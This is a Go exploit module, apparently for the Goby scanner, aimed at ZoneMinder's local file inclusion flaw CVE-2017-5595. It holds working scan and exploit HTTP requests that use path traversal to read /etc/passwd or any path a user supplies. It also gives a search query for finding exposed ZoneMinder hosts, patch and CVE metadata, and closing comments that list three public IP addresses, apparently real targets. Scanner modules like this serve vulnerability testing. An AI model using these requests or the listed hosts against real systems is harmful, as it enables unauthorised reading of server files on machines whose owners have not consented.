package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "ZoneMinder Local File Inclusion (CVE-2017-5595)",
    "Description": "<p>ZoneMinder is an open source video surveillance software system. The system supports IP, USB and analog cameras, etc.</p><p>A file inclusion vulnerability exists in the web/views/file.php file in ZoneMinder versions 1.x to 1.30.0. The vulnerability arises from the program not filtering user input passed to the 'readfile()' function. An attacker could exploit this vulnerability to read local files with specially crafted parameters.</p>",
    "Product": "ZoneMinder",
    "Homepage": "https://github.com/ZoneMinder/ZoneMinder/",
    "DisclosureDate": "2022-05-03",
    "Author": "abszse",
    "FofaQuery": "banner=\"Set-Cookie: ZMSESSID=\" || header=\"Set-Cookie: ZMSESSID=\"",
    "GobyQuery": "banner=\"Set-Cookie: ZMSESSID=\" || header=\"Set-Cookie: ZMSESSID=\"",
    "Level": "2",
    "Impact": "<p>A file inclusion vulnerability exists in the web/views/file.php file in ZoneMinder versions 1.x to 1.30.0. The vulnerability arises from the program not filtering user input passed to the 'readfile()' function. An attacker could exploit this vulnerability to read local files with specially crafted parameters.</p>",
    "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix this security issue. The link to obtain the patch is: <a href=\"https://github.com/ZoneMinder/ZoneMinder/commit/8b19fca9927cdec07cc9dd09bdcf2496a5ae69b3\">https://github.com/ZoneMinder/ZoneMinder/commit/8b19fca9927cdec07cc9dd09bdcf2496a5ae69b3</a></p>",
    "References": [
        "https://seclists.org/bugtraq/2017/Feb/6"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "/../../../../../etc/passwd",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "OR",
        {
            "Request": {
                "method": "GET",
                "uri": "/index.php?view=file&path=/../../../../../etc/passwd",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "regex",
                        "value": "root:.*:0:0:",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/zm/index.php?view=file&path=/../../../../../etc/passwd",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "regex",
                        "value": "root:.*:0:0:",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "OR",
        {
            "Request": {
                "method": "GET",
                "uri": "/index.php?view=file&path={{{cmd}}}",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody||"
            ]
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/zm/index.php?view=file&path={{{cmd}}}",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody||"
            ]
        }
    ],
    "Tags": [
        "File Inclusion"
    ],
    "VulType": [
        "File Inclusion"
    ],
    "CVEIDs": [
        "CVE-2017-5595"
    ],
    "CNNVD": [
        "CNNVD-201702-111"
    ],
    "CNVD": [
        "CNVD-2017-01288"
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "ZoneMinder 本地文件包含漏洞（CVE-2017-5595）",
            "Product": "ZoneMinder",
            "Description": "<p>ZoneMinder是一套开源的视频监控软件系统。该系统支持IP、USB和模拟摄像机等。<br></p><p>ZoneMinder 1.x版本至1.30.0版本中的web/views/file.php文件存在文件包含漏洞，该漏洞源于程序没有过滤传递到‘readfile()’函数的用户输入。攻击者可借助特制的参数利用该漏洞读取本地文件。<br></p>",
            "Recommendation": "<p>目前厂商已经发布了升级补丁以修复此安全问题，补丁获取链接：<a href=\"https://github.com/ZoneMinder/ZoneMinder/commit/8b19fca9927cdec07cc9dd09bdcf2496a5ae69b3\">https://github.com/ZoneMinder/ZoneMinder/commit/8b19fca9927cdec07cc9dd09bdcf2496a5ae69b3</a><br></p>",
            "Impact": "<p>ZoneMinder 1.x版本至1.30.0版本中的web/views/file.php文件存在文件包含漏洞，该漏洞源于程序没有过滤传递到‘readfile()’函数的用户输入。攻击者可借助特制的参数利用该漏洞读取本地文件。<br></p>",
            "VulType": [
                "文件包含"
            ],
            "Tags": [
                "文件包含"
            ]
        },
        "EN": {
            "Name": "ZoneMinder Local File Inclusion (CVE-2017-5595)",
            "Product": "ZoneMinder",
            "Description": "<p>ZoneMinder is an open source video surveillance software system. The system supports IP, USB and analog cameras, etc.<br></p><p>A file inclusion vulnerability exists in the web/views/file.php file in ZoneMinder versions 1.x to 1.30.0. The vulnerability arises from the program not filtering user input passed to the 'readfile()' function. An attacker could exploit this vulnerability to read local files with specially crafted parameters.<br></p>",
            "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix this security issue. The link to obtain the patch is: <a href=\"https://github.com/ZoneMinder/ZoneMinder/commit/8b19fca9927cdec07cc9dd09bdcf2496a5ae69b3\">https://github.com/ZoneMinder/ZoneMinder/commit/8b19fca9927cdec07cc9dd09bdcf2496a5ae69b3</a><br></p>",
            "Impact": "<p>A file inclusion vulnerability exists in the web/views/file.php file in ZoneMinder versions 1.x to 1.30.0. The vulnerability arises from the program not filtering user input passed to the 'readfile()' function. An attacker could exploit this vulnerability to read local files with specially crafted parameters.<br></p>",
            "VulType": [
                "File Inclusion"
            ],
            "Tags": [
                "File Inclusion"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10666"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
//http://24.35.239.158
//http://180.250.242.41
//http://176.107.124.43